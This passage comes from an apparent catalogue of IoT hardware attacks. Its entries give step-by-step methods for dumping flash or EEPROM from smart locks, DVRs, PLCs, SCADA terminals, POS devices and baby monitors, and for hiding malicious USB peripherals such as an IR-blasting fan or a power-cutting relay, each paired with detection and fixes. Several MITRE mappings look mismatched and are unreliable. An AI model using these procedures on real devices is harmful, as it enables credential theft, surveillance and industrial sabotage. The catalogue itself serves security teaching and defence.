- **Solution**: Use tamper-proof ports and authorized device list
- **Tags**: Vending Hack, Input Logging, USB Hub Attack

## USB Fan with IR Blaster Controls Smart TV Without User Consent

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart TV
- **Vulnerability**: IR signal acceptance without authentication
- **MITRE**: T1204.002
- **Impact**: Remote control hijack
- **Tools**: USB fan with IR LED, Arduino Nano, IR remote dump
- **Scenario**: A USB-powered fan secretly emits infrared signals to send unauthorized commands to nearby smart TVs.
- **Attack Steps**: Step 1: Attacker programs an IR blaster using an Arduino to send common Smart TV remote codes (e.g., change input, show QR, install app).Step 2: IR blaster is embedded inside a working USB fan.Step 3: Fan is plugged into a port near the Smart TV in an office or hotel.Step 4: At specific intervals, the IR LED emits commands (e.g., switch to HDMI input, install streaming malware).Step 5: Users are unaware as commands appear to be normal remote inputs.Step 6: TV is hijacked for phishing or crypto mining display.
- **Detection**: Detect unusual input patterns via remote logs
- **Solution**: Limit IR command acceptance or pair IR signals
- **Tags**: IR Blaster, Smart TV Abuse, USB Fan Hack

## USB-Based Relay Board Shuts Down Smart Factory Equipment

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Factory Gateway
- **Vulnerability**: Power supply exposed via USB relay
- **MITRE**: T1499.001
- **Impact**: Equipment failure, industrial sabotage
- **Tools**: USB Relay board, Command-line control utility
- **Scenario**: A disguised USB relay board is used to interrupt power to factory IoT systems at precise times.
- **Attack Steps**: Step 1: Attacker installs a USB relay board disguised as a diagnostic tool.Step 2: Board is connected to the factory’s IoT gateway power lines.Step 3: Using a simple script, the attacker can switch relays to interrupt power briefly.Step 4: These power cuts lead to shutdowns, resets, or fault states in robotic lines.Step 5: Attacker controls the timing for maximum disruption (e.g., during critical operations).Step 6: No network traces are left as it's physically triggered via USB.
- **Detection**: Monitor power stability and USB relay activity
- **Solution**: Secure physical ports and disable local USB relay controls
- **Tags**: USB Relay, Factory Disruption, Hardware Attack

## USB Thermal Printer Used to Exfiltrate Data from IoT POS

- **Attack Type**: Malicious Peripheral Attack
- **Target**: IoT Point-of-Sale Terminal
- **Vulnerability**: Print function not monitored for data patterns
- **MITRE**: T1020
- **Impact**: Data exfiltration via physical medium
- **Tools**: USB thermal printer, Base64 encoder script
- **Scenario**: A thermal receipt printer prints encoded data that contains sensitive information from the POS system.
- **Attack Steps**: Step 1: Attacker connects a USB thermal printer to the POS system.Step 2: A script on the POS terminal encodes sensitive data (e.g., credit card info, login sessions) into Base64 text.Step 3: Encoded text is sent to the printer to look like a long receipt.Step 4: The attacker picks up the receipt, which appears harmless.Step 5: At home, attacker decodes the text to recover original data.Step 6: The system doesn’t log the print as exfiltration.
- **Detection**: Monitor print jobs for anomalies
- **Solution**: Audit content and limit non-receipt printing
- **Tags**: Print Exfiltration, Covert Data Leak

## USB Toy with Bluetooth Module Connects to Smart Toys and Eavesdrops

- **Attack Type**: Malicious Peripheral Attack
- **Target**: Smart Toy, BLE-enabled
- **Vulnerability**: Insecure BLE pairing protocols
- **MITRE**: T1421
- **Impact**: Child privacy violation, behavioral data theft
- **Tools**: USB-powered toy, BLE sniffer chip, Wireshark
- **Scenario**: A USB toy contains a hidden BLE sniffer module that connects to nearby smart toys and listens to communication.
- **Attack Steps**: Step 1: Attacker modifies a USB toy to include a Bluetooth Low Energy (BLE) sniffer.Step 2: Toy is placed in a child’s room and plugged into a wall USB socket or smart speaker.Step 3: BLE sniffer scans for smart toys and attempts pairing or passive sniffing.Step 4: It logs conversations, sensor triggers, or data sent to/from the toys.Step 5: Logs are stored on internal flash and retrieved later via USB.Step 6: Attacker gains private data like names, messages, or behavior logs.
- **Detection**: Monitor BLE pairing logs, disable auto-discovery
- **Solution**: Require authenticated pairing, encrypt BLE data
- **Tags**: Toy Spy, Bluetooth Sniffer, USB BLE Attack

## Smart Door Lock Forensic Dump via Flash Chip Extraction

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Door Lock
- **Vulnerability**: Lack of full disk encryption
- **MITRE**: T1005: Data from Removable Media
- **Impact**: Unauthorized access to physical lock systems
- **Tools**: Screwdriver, Hot Air Rework Station, SPI Flash Reader (e.g., CH341A), Flashrom, Hex Editor
- **Scenario**: An attacker steals a smart door lock and physically removes the flash memory to extract stored credentials.
- **Attack Steps**: Step 1: Locate a smart lock in a lab environment.Step 2: Use a screwdriver to open the casing and identify the flash memory chip (usually an 8-pin IC).Step 3: Desolder the chip using a hot air rework station.Step 4: Place the chip into an SPI flash reader like CH341A.Step 5: Use flashrom tool to dump the firmware into a .bin file.Step 6: Open the .bin file using a hex editor to search for readable usernames, passwords, or encryption keys.Step 7: Use recovered credentials to unlock identical devices or backdoor similar ones.
- **Detection**: Monitoring for firmware tampering or missing devices
- **Solution**: Encrypt flash data at rest; epoxy over chips; tamper detection
- **Tags**: smart lock, SPI dump, forensic, memory chip

## CCTV DVR Theft & SATA Disk Forensic Recovery

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: DVR/NVR Systems
- **Vulnerability**: No drive encryption, logs in plaintext
- **MITRE**: T1560.001: Archive via Utility
- **Impact**: Privacy breach, surveillance evasion
- **Tools**: Phillips Screwdriver, SATA-to-USB Adapter, FTK Imager, Autopsy, Notepad++
- **Scenario**: An attacker steals a CCTV DVR and extracts video footage and admin credentials from the hard drive.
- **Attack Steps**: Step 1: Obtain a CCTV DVR and disconnect it from power.Step 2: Use a screwdriver to open the case and remove the internal SATA hard drive.Step 3: Connect the drive to a PC using a SATA-to-USB adapter.Step 4: Use FTK Imager to create a forensic image of the drive.Step 5: Open the image in Autopsy and search for .log, .dat, or .ini files.Step 6: Locate plaintext admin credentials or camera stream details.Step 7: Replay or extract video footage from proprietary formats using video players or converters.
- **Detection**: Device not returning heartbeat; log access detection
- **Solution**: Encrypt drive; secure boot; watchdog timer for removal
- **Tags**: DVR, forensics, disk image, video recovery

## GPS Tracker Dump via UART & NAND Flash Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Vehicle GPS Tracker
- **Vulnerability**: Exposed debug ports; unencrypted storage
- **MITRE**: T1005: Data from Removable Media
- **Impact**: Tracking history compromise; SIM cloning
- **Tools**: USB-UART Adapter, NAND Reader, Putty, Binwalk, Strings
- **Scenario**: A GPS tracker from a vehicle is stolen and dumped via UART and NAND interface to extract location history and network data.
- **Attack Steps**: Step 1: Remove the GPS tracker from the vehicle.Step 2: Open the casing and locate UART pins (usually labeled TX, RX, GND).Step 3: Connect USB-UART adapter and open Putty with the correct baud rate.Step 4: Access serial console if available and try default credentials.Step 5: Desolder NAND flash and read with NAND reader.Step 6: Use Binwalk to analyze the firmware and extract filesystem.Step 7: Use strings to locate .csv or .log files storing historical GPS or SIM data.
- **Detection**: Serial communication alerting; tripwire logs
- **Solution**: Disable debug ports; encrypt logs; use epoxy
- **Tags**: gps, NAND, UART, forensics

## Medical Wearable Theft & Flash Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Health Tracker
- **Vulnerability**: Lack of encrypted storage and cloud auth
- **MITRE**: T1123: Audio Capture (via logs)
- **Impact**: Health data breach; unauthorized cloud sync
- **Tools**: Screwdriver, SPI Flash Reader, Flashrom, Ghidra
- **Scenario**: A health tracker is stolen and dumped for sensitive health metrics and synced data.
- **Attack Steps**: Step 1: Remove the wristband and open the wearable casing.Step 2: Identify and desolder the flash memory chip (often 4MB–16MB SPI NOR).Step 3: Use an SPI reader to read the memory using flashrom.Step 4: Open the dump in Ghidra and analyze for strings or structured data.Step 5: Extract timestamps, health logs, and pairing keys to cloud.Step 6: Attempt cloud API re-registration using recovered device token.
- **Detection**: Monitor API access per device ID
- **Solution**: Secure enclave; encrypted pairing tokens
- **Tags**: wearable, SPI, health, data dump

## Industrial Sensor Data Dump via EEPROM Read

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Industrial Sensor
- **Vulnerability**: Unprotected I2C EEPROM; insecure config storage
- **MITRE**: T1074: Data Staged
- **Impact**: Plant sabotage; unauthorized configuration
- **Tools**: EEPROM Reader (I2C), Logic Analyzer, Bus Pirate, EEPROM Dump Tool
- **Scenario**: An attacker physically removes a temperature sensor from a facility and reads its EEPROM to extract calibration data, keys, and logs.
- **Attack Steps**: Step 1: Take the industrial sensor to a lab setup.Step 2: Locate the EEPROM chip (usually I2C, 4 to 8 pins).Step 3: Connect the Bus Pirate or EEPROM reader to the chip.Step 4: Use EEPROM dump tools to extract content.Step 5: Analyze dumped data in hex viewer.Step 6: Extract security credentials, network config, or operational logs.Step 7: Modify or clone the sensor's configuration for reuse or spoofing.
- **Detection**: Physical tamper monitoring
- **Solution**: Protect memory with epoxy; encrypt config
- **Tags**: sensor, EEPROM, data spoofing

## Smart Meter Dump via SoC Interface

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Meter
- **Vulnerability**: Debug ports exposed; default credentials
- **MITRE**: T1005: Data from Removable Media
- **Impact**: Theft of energy consumption logs and configuration tampering
- **Tools**: Soldering Kit, UART to USB Adapter, Multimeter, Minicom, Binwalk
- **Scenario**: An attacker physically removes a smart electricity meter and accesses the SoC (System on Chip) interface to dump configuration and billing data.
- **Attack Steps**: Step 1: Remove the smart meter from the test setup (not a live one).Step 2: Identify the UART/Serial test pads or header pins using a multimeter (look for TX/RX/GND).Step 3: Connect the UART to USB adapter and power the board using the internal power supply or a bench power source.Step 4: Use Minicom or TeraTerm to connect at common baud rates (115200, 9600).Step 5: If a login prompt appears, attempt default credentials (admin/admin).Step 6: Use shell access to read configuration files or logs (e.g., /etc/meter.conf).Step 7: Dump contents of /etc or /logs directory for offline analysis using SCP or SD card.Step 8: Analyze the dump using Binwalk or Strings.
- **Detection**: Serial port detection; unexpected config changes
- **Solution**: Disable debug ports; use signed firmware
- **Tags**: smartmeter, SoC, UART, forensic

## Smart Thermostat Internal Flash Dump via SWD

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Thermostat
- **Vulnerability**: SWD left exposed; config in plaintext
- **MITRE**: T1602.001: Data from Configuration Repository
- **Impact**: Privacy breach, device cloning
- **Tools**: ST-Link V2 Debugger, OpenOCD, Flash Download Tool, Ghidra
- **Scenario**: An attacker removes a smart thermostat and accesses its internal flash via SWD (Serial Wire Debug).
- **Attack Steps**: Step 1: Dismantle the thermostat and locate the microcontroller.Step 2: Identify SWDIO and SWCLK pins using the microcontroller datasheet.Step 3: Connect ST-Link V2 debugger to the target pins.Step 4: Use OpenOCD or STM32CubeProgrammer to read flash.Step 5: Save the dump in .bin format.Step 6: Open the binary in Ghidra to reverse engineer the firmware.Step 7: Search for plaintext config, Wi-Fi credentials, or embedded API keys.Step 8: Extract and replicate the config to another device.
- **Detection**: Monitor for debug interface usage
- **Solution**: Disable debug ports; set read-out protection (RDP)
- **Tags**: SWD, thermostat, memory dump

## Smart Fridge NAND Flash Dump for API Keys

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Refrigerator
- **Vulnerability**: Lack of encrypted cloud tokens
- **MITRE**: T1140: Deobfuscate/Decode Files or Information
- **Impact**: Remote control of fridge features, data leak
- **Tools**: Hot Air Station, NAND Reader, Binwalk, Hex Editor
- **Scenario**: A smart fridge is dismantled to extract cloud API tokens and encryption keys via NAND flash dump.
- **Attack Steps**: Step 1: Unplug and dismantle the smart fridge controller board.Step 2: Locate the NAND flash chip (typically 8–16 pins).Step 3: Desolder the chip using a hot air station.Step 4: Place the chip into a NAND reader.Step 5: Use NAND reading software to dump memory to .bin.Step 6: Analyze the dump with Binwalk to extract file systems.Step 7: Use a hex editor or strings to locate cloud tokens or .pem key files.Step 8: Replay captured API keys on test server to simulate data access.
- **Detection**: Alert on API token re-use
- **Solution**: Encrypt tokens; secure key vaults
- **Tags**: fridge, NAND, token, forensic

## Baby Monitor Flash Dump via SOIC Clip

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Baby Monitor
- **Vulnerability**: Unencrypted flash, no tamper protection
- **MITRE**: T1115: Clipboard Data
- **Impact**: Privacy breach, stalking simulation
- **Tools**: SOIC-8 Test Clip, CH341A Programmer, Flashrom, Notepad++
- **Scenario**: The attacker clips onto a baby monitor’s SPI flash chip in-circuit to extract stored video files and admin credentials.
- **Attack Steps**: Step 1: Unplug baby monitor and open the casing.Step 2: Identify the SPI flash chip using the chip label (e.g., Winbond W25Q32).Step 3: Clip on a SOIC test clip without desoldering.Step 4: Connect CH341A programmer to the clip.Step 5: Use flashrom to dump the chip to a binary file.Step 6: Open the file in Notepad++ or Hex Editor to look for video file headers or credentials.Step 7: If video data is present, extract and convert using FFmpeg.Step 8: Simulate unauthorized viewing of archived footage.
- **Detection**: Monitor for device removal or disconnection
- **Solution**: Encrypted storage; epoxy over chips
- **Tags**: baby monitor, SPI, SOIC clip

## Smart TV Motherboard Dump for Viewing History

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart TV
- **Vulnerability**: Persistent unencrypted viewing logs
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: Privacy exposure; SSID leak
- **Tools**: Multimeter, SPI Reader, Binwalk, SQLite Browser
- **Scenario**: Smart TV's board is removed and dumped to recover app usage, viewing history, and Wi-Fi credentials.
- **Attack Steps**: Step 1: Remove the TV's back cover carefully and isolate the mainboard.Step 2: Locate the SPI flash chip and read the chip ID to ensure compatibility.Step 3: Use SPI reader to dump contents.Step 4: Use Binwalk to extract filesystem.Step 5: Identify SQLite databases (e.g., tv_log.db, wifi.db).Step 6: Use SQLite Browser to open and search for SSIDs, passwords, app names, and timestamps.Step 7: Export logs to show how app data is retained without user consent.
- **Detection**: Track filesystem checksum changes
- **Solution**: Use encryption; clear logs periodically
- **Tags**: smart TV, dump, logs, SQLite

## eScooter Controller Dump to Clone Access Tokens

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: eScooter
- **Vulnerability**: NFC token in EEPROM without obfuscation
- **MITRE**: T1557.003: Transitive Access
- **Impact**: Physical theft, cloning of access
- **Tools**: RFID Reader/Writer, EEPROM Reader, Logic Analyzer, Bus Pirate
- **Scenario**: Attacker opens stolen eScooter controller to clone RFID/NFC access tokens used to unlock the vehicle.
- **Attack Steps**: Step 1: Remove the scooter’s controller box (often beneath the footboard).Step 2: Locate and remove EEPROM or NFC controller chip.Step 3: Read contents using EEPROM reader or NFC dumper.Step 4: Use Logic Analyzer to intercept communication between NFC tag and reader.Step 5: Decode token patterns and save.Step 6: Replay tokens using cloned card or emulator like Proxmark3.Step 7: Simulate unauthorized scooter unlocking.
- **Detection**: Physical lock tampering alert
- **Solution**: Secure token in hardware-backed vault
- **Tags**: scooter, NFC, EEPROM, clone

## Smart Home Hub SSD Forensic Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Home Hub
- **Vulnerability**: SSD data not encrypted
- **MITRE**: T1552: Unsecured Credentials
- **Impact**: Total surveillance compromise
- **Tools**: Screwdriver, SATA to USB Adapter, FTK Imager, Autopsy
- **Scenario**: Attacker removes SSD from smart home hub to extract footage, device pairing info, and logs.
- **Attack Steps**: Step 1: Disassemble the home hub and remove SSD.Step 2: Connect it to PC using SATA-to-USB adapter.Step 3: Create a forensic image using FTK Imager.Step 4: Open image in Autopsy and explore directories like /home, /var/log, /media.Step 5: Locate camera footage files (e.g., .avi, .mp4) and logs indicating device pairing history.Step 6: Check if configuration files contain plain Wi-Fi credentials or MQTT broker details.Step 7: Export evidence for educational analysis.
- **Detection**: Storage removal detection
- **Solution**: Use full-disk encryption
- **Tags**: smart home, SSD, logs

## Smart Speaker NAND Dump for Voice Snippets

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Speaker
- **Vulnerability**: Audio cache not protected
- **MITRE**: T1123: Audio Capture
- **Impact**: Voice data breach, user profiling
- **Tools**: NAND Reader, Hex Editor, Binwalk, Audacity
- **Scenario**: Smart speaker is opened and NAND dumped to retrieve cached voice interactions.
- **Attack Steps**: Step 1: Open smart speaker and locate NAND chip.Step 2: Desolder the chip and place into NAND reader.Step 3: Dump contents and analyze with Binwalk.Step 4: Locate audio cache folders or WAV file headers.Step 5: Extract raw audio and open in Audacity.Step 6: Replay snippets and identify voice commands and PII.Step 7: Explain how caching without encryption poses threats.
- **Detection**: Audio logs comparison, checksum
- **Solution**: Encrypted temporary storage
- **Tags**: speaker, NAND, audio cache

## Security Panel Flash Dump to Access PINs

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Security Panel
- **Vulnerability**: Weak or no PIN storage protection
- **MITRE**: T1110.003: Brute Force
- **Impact**: Alarm disarm, physical break-in
- **Tools**: Screwdriver, SPI Reader, Flashrom, Hex Editor
- **Scenario**: Security panel's flash is dumped to extract stored PINs and alarm configuration.
- **Attack Steps**: Step 1: Remove the panel from the wall.Step 2: Open case to reveal flash memory chip.Step 3: Connect SPI reader and dump flash via flashrom.Step 4: Analyze dump for config.ini, users.db, or similar.Step 5: Use Hex Editor or Notepad++ to identify PIN entries.Step 6: Demonstrate how weak encoding (e.g., base64) is easy to reverse.Step 7: Simulate disarming via recovered PIN.
- **Detection**: Unusual config file readout
- **Solution**: Use HSM for PIN verification
- **Tags**: panel, pin, flash

## Industrial HMI Dump for SCADA Access Tokens

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: SCADA HMI
- **Vulnerability**: CF card with config stored unprotected
- **MITRE**: T1021.004: Remote Services
- **Impact**: Critical infrastructure abuse
- **Tools**: Compact Flash Reader, FTK Imager, Ghidra, SQLite Browser
- **Scenario**: HMI terminal used in SCADA is stolen and dumped to access operator credentials and PLC tokens.
- **Attack Steps**: Step 1: Remove CF card from the HMI terminal.Step 2: Read using CF-to-USB adapter.Step 3: Clone card with FTK Imager.Step 4: Analyze binaries using Ghidra.Step 5: Open SQLite files for credentials or last PLC IP.Step 6: Reuse token to send unauthorized control commands.Step 7: Simulate SCADA compromise.
- **Detection**: Monitor config usage outside facility
- **Solution**: Encrypt tokens; use TPM
- **Tags**: HMI, SCADA, dump

## Smart Router Dump via NAND Flash for ISP Credentials

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Router
- **Vulnerability**: Credentials stored in plaintext config files
- **MITRE**: T1005: Data from Removable Media
- **Impact**: Full network takeover, MITM attacks
- **Tools**: Screwdriver, Hot Air Station, NAND Reader, Binwalk, Hex Editor
- **Scenario**: Attacker steals a home smart router, extracts its flash memory, and retrieves admin and ISP login credentials.
- **Attack Steps**: Step 1: Remove the router casing with a screwdriver.Step 2: Locate the NAND flash chip, often labeled Micron, Samsung, or Winbond.Step 3: Desolder it carefully using a hot air rework station.Step 4: Insert chip into NAND reader and dump contents.Step 5: Run Binwalk to extract filesystem structure.Step 6: Look for /etc/pppoe.conf, passwd, or config backup files.Step 7: Open in Hex Editor to find plaintext or base64-encoded ISP credentials.Step 8: Simulate login into ISP interface using dumped credentials.
- **Detection**: Unusual ISP login patterns
- **Solution**: Encrypt config; secure credential storage
- **Tags**: router, NAND, ISP login, credentials

## Industrial PLC Controller Flash Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: PLC Controller
- **Vulnerability**: Debug interfaces left active
- **MITRE**: T1602: Data from Configuration Repositories
- **Impact**: Plant process control bypass
- **Tools**: JTAG Debugger, Multimeter, OpenOCD, Ghidra, Ladder Logic Viewer
- **Scenario**: A PLC unit is physically removed and its flash memory dumped to extract control logic and operator passwords.
- **Attack Steps**: Step 1: Remove the industrial PLC from the control system.Step 2: Use multimeter and datasheet to find JTAG pinout.Step 3: Connect a JTAG debugger and power the board safely.Step 4: Dump firmware via OpenOCD.Step 5: Analyze firmware using Ghidra to locate control logic structure.Step 6: Extract ladder logic and identify operator accounts or static passwords.Step 7: Use this logic to simulate unauthorized commands.Step 8: Replay logic on a test PLC to demonstrate possible sabotage.
- **Detection**: Physical tamper alarms
- **Solution**: Lock JTAG, use firmware protection fuses
- **Tags**: PLC, firmware, ladder logic

## Smart Irrigation Controller SPI Dump for Cloud Access

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Irrigation Controller
- **Vulnerability**: Unencrypted token and Wi-Fi storage
- **MITRE**: T1552.001: Credentials in Files
- **Impact**: Hijack watering schedules, DDoS via cloud abuse
- **Tools**: SPI Flash Reader, CH341A, Flashrom, Strings, Notepad++
- **Scenario**: An attacker removes a smart irrigation controller and extracts flash memory for tokens and Wi-Fi info.
- **Attack Steps**: Step 1: Detach the irrigation controller from the outdoor unit.Step 2: Open the housing and locate the 8-pin SPI flash chip.Step 3: Clip onto the chip using SOIC clip and CH341A programmer.Step 4: Use flashrom to read and dump the memory.Step 5: Use strings to search for known strings like “SSID”, “token=”, or “mqtt://”.Step 6: Open with Notepad++ to review API endpoints and cloud service keys.Step 7: Demonstrate cloud account takeover simulation using harvested credentials.
- **Detection**: Device ID reuse detection on cloud
- **Solution**: Encrypt all secrets, use OTP auth
- **Tags**: irrigation, SPI, MQTT token

## Smart Lighting Panel Theft and EEPROM Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Lighting Controller
- **Vulnerability**: EEPROM contents not encrypted
- **MITRE**: T1119: Automated Collection
- **Impact**: Light automation abuse or access signal theft
- **Tools**: EEPROM Reader, Bus Pirate, EEPROM Dump Tool, Hex Editor
- **Scenario**: Attacker dumps EEPROM to gain access to lighting zone passwords and scheduling info.
- **Attack Steps**: Step 1: Physically remove the smart lighting panel from the wall.Step 2: Locate EEPROM chip near microcontroller (usually 24Cxx series).Step 3: Connect Bus Pirate in I2C mode to EEPROM pins.Step 4: Use EEPROM dump tool to read contents.Step 5: Search for string sequences resembling passwords or time schedule formats.Step 6: Extract info and demonstrate lighting manipulation.Step 7: Simulate override on cloned panel.
- **Detection**: Pattern anomalies in schedules
- **Solution**: Use secure memory modules; encrypted comms
- **Tags**: lighting, EEPROM, schedule dump

## Smart Lockbox Controller Dump for Code Retrieval

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Lockbox
- **Vulnerability**: Insecure storage of unlock codes
- **MITRE**: T1552.002: Credentials in Registry
- **Impact**: Theft and physical access bypass
- **Tools**: SPI Clip, Flashrom, Hex Editor, Python Parser Script
- **Scenario**: Dumping memory from a smart lockbox reveals stored PIN codes and unlock sequences.
- **Attack Steps**: Step 1: Detach the lockbox and open the back cover.Step 2: Find SPI flash chip; attach a SOIC test clip.Step 3: Use Flashrom with SPI reader to dump memory.Step 4: Load file in hex editor or use Python to parse JSON/PIN logs.Step 5: Extract PINs and simulate brute-force-free unlock.Step 6: Clone memory into another lockbox for backdoor access.
- **Detection**: Tamper logs; failed auth tracking
- **Solution**: Use secure element for PIN
- **Tags**: lockbox, SPI dump, PIN code

## Connected Air Purifier Cloud Token Extraction

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Air Purifier
- **Vulnerability**: API tokens not encrypted or expired
- **MITRE**: T1113: Screen Capture / Device Status
- **Impact**: Unauthorized cloud control
- **Tools**: Flash Reader, Wireshark (optional), Hex Editor, Binwalk
- **Scenario**: Forensic dump of a smart air purifier reveals access tokens to control via mobile app APIs.
- **Attack Steps**: Step 1: Dismantle the air purifier and identify the flash chip.Step 2: Use SPI reader and dump the firmware.Step 3: Run Binwalk to extract file system.Step 4: Use Hex Editor or grep to locate OAuth tokens, device_id, and app sync data.Step 5: Replay API calls to simulate remote control via test cloud.Step 6: Demonstrate unintended remote usage.
- **Detection**: API usage anomaly tracking
- **Solution**: Short token TTL, device binding
- **Tags**: air purifier, API, dump

## POS Terminal Dump for Card Log Retrieval

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: POS Terminal
- **Vulnerability**: Card logs stored locally in plaintext
- **MITRE**: T1074: Data Staged
- **Impact**: Payment data leakage
- **Tools**: SD Card Reader, FTK Imager, SQLite Browser
- **Scenario**: A retail PoS terminal is opened and internal memory dumped to retrieve recent card transactions.
- **Attack Steps**: Step 1: Open the back cover of the POS device.Step 2: Remove microSD or internal flash card.Step 3: Clone the card using FTK Imager.Step 4: Open cloned image using SQLite Browser.Step 5: Search for transaction logs with partial card data (PAN, amount).Step 6: Simulate PoS breach and customer info exposure.Step 7: Educate on PCI DSS compliance gap.
- **Detection**: Monitor for unauthorized removal
- **Solution**: Encrypt logs, auto-wipe after sync
- **Tags**: POS, card logs, SQLite

## LoRa-Based IoT Device EEPROM Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: LoRa IoT Sensor
- **Vulnerability**: Static keys in EEPROM
- **MITRE**: T1557.002: Man-in-the-Middle
- **Impact**: LoRa session hijacking
- **Tools**: EEPROM Reader, Logic Analyzer, Python Decoder Script
- **Scenario**: Attacker extracts EEPROM from a LoRa-based sensor to obtain device ID and transmission keys.
- **Attack Steps**: Step 1: Open the LoRa sensor enclosure.Step 2: Identify EEPROM using chip label and datasheet.Step 3: Connect reader and dump EEPROM.Step 4: Use Python script to decode LoRaWAN credentials (DevEUI, AppSKey, NwkSKey).Step 5: Replay captured packets on test network to simulate eavesdropping.Step 6: Show how key theft affects device authentication.
- **Detection**: Network behavior analysis
- **Solution**: Use dynamic session keys
- **Tags**: LoRa, EEPROM, key theft

## Telematics Unit Dump in Automotive

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Telematics Control Unit
- **Vulnerability**: GPS logs in plaintext, pairing data not wiped
- **MITRE**: T1083: File and Directory Discovery
- **Impact**: Driver surveillance, privacy invasion
- **Tools**: SPI Programmer, Ghidra, SQLite Viewer
- **Scenario**: Dumping flash from a vehicle's telematics unit reveals GPS trails and phone pairing info.
- **Attack Steps**: Step 1: Unplug and remove the telematics ECU.Step 2: Identify and read the SPI flash chip.Step 3: Analyze firmware with Ghidra for data references.Step 4: Locate SQLite or flat files with GPS logs or Bluetooth pair history.Step 5: Extract data to simulate tracking of driver history.Step 6: Discuss forensic impact in insurance fraud or spying.
- **Detection**: Behavior analysis alerts
- **Solution**: Encrypt logs, auto-wipe history
- **Tags**: car, telematics, GPS dump

## eHealth Bracelet Flash Dump for User Profiles

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: eHealth Bracelet
- **Vulnerability**: Health logs unencrypted on-device
- **MITRE**: T1119: Automated Collection
- **Impact**: Health data exposure
- **Tools**: SPI Reader, Flashrom, Binwalk, CSV Viewer
- **Scenario**: Forensic memory dump reveals user profiles, daily steps, and health data.
- **Attack Steps**: Step 1: Open the casing of the eHealth bracelet.Step 2: Connect SPI reader to flash chip.Step 3: Dump memory using Flashrom.Step 4: Extract file system using Binwalk.Step 5: Locate .csv or .json files with user logs.Step 6: Open files with CSV Viewer to simulate data leaks.Step 7: Highlight privacy implications.
- **Detection**: File access pattern monitoring
- **Solution**: Encrypt logs, cloud-sync only
- **Tags**: health band, user dump, CSV

## Smart Pet Feeder Dump for Cloud Credential Leak

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Pet Feeder
- **Vulnerability**: API token stored in plaintext
- **MITRE**: T1552.001: Credentials in Files
- **Impact**: Remote control over smart feeder
- **Tools**: SPI Flash Reader, Binwalk, Hex Editor, Python Script
- **Scenario**: Attacker extracts memory from a stolen smart pet feeder and uncovers cloud credentials for remote app control.
- **Attack Steps**: Step 1: Disassemble the feeder and locate the SPI flash chip (usually 8-pin).Step 2: Connect the chip to an SPI reader using a SOIC clip.Step 3: Use flashrom to create a binary dump.Step 4: Run Binwalk to extract embedded file system.Step 5: Open extracted config or token files with Hex Editor or Python script.Step 6: Extract cloud API keys, device tokens, or user login tokens.Step 7: Replay token via API calls to simulate unauthorized control over the feeder.
- **Detection**: API access anomaly
- **Solution**: Token encryption and short expiration
- **Tags**: smart pet, token dump, cloud creds

## Access Control Reader EEPROM Dump

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: RFID Access Reader
- **Vulnerability**: Badge data stored unencrypted
- **MITRE**: T1078: Valid Accounts
- **Impact**: Unauthorized facility entry
- **Tools**: EEPROM Reader, Logic Analyzer, Python Parser, Notepad++
- **Scenario**: Memory dump of RFID access control unit reveals stored badge IDs and access schedule logs.
- **Attack Steps**: Step 1: Remove the access reader device from wall.Step 2: Locate and connect to EEPROM chip (24C series) using clip.Step 3: Use EEPROM reader to extract memory.Step 4: Use Notepad++ or a custom Python script to decode RFID tag data and access schedules.Step 5: Simulate cloning badge ID or scheduling a backdoor access.Step 6: Demonstrate replaying the badge ID with Proxmark3 or emulator.
- **Detection**: Badge replay anomaly
- **Solution**: Encrypt RFID logs; token rotation
- **Tags**: RFID, EEPROM, badge clone

## Smart Washing Machine Dump for Wi-Fi Keys

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Washing Machine
- **Vulnerability**: Wi-Fi credentials in plaintext
- **MITRE**: T1552: Unsecured Credentials
- **Impact**: Network access via appliance
- **Tools**: SPI Reader, Flashrom, Strings Tool, Text Editor
- **Scenario**: Attacker dumps memory of a smart washing machine to retrieve stored Wi-Fi credentials.
- **Attack Steps**: Step 1: Open washing machine’s control board panel.Step 2: Identify and clip onto the SPI flash.Step 3: Dump memory with flashrom.Step 4: Use strings tool to find SSIDs and stored passwords.Step 5: Open results in Notepad++ and highlight password strings.Step 6: Use these to connect to the victim's Wi-Fi network in test lab.
- **Detection**: MAC address-based alerting
- **Solution**: Encrypt Wi-Fi configs
- **Tags**: washing machine, Wi-Fi keys

## Connected Coffee Machine Dump for User Profiles

- **Attack Type**: Physical Theft & Forensic Dumping
- **Target**: Smart Coffee Machine
- **Vulnerability**: User settings stored unencrypted
- **MITRE**: T1213.003: Data from Information Repositories
- **Impact**: User profiling; potential spoofing
- **Tools**: EEPROM Clip, Hex Editor, Python Decoder
- **Scenario**: Coffee machine’s internal memory is dumped to extract saved user preferences and scheduling info.
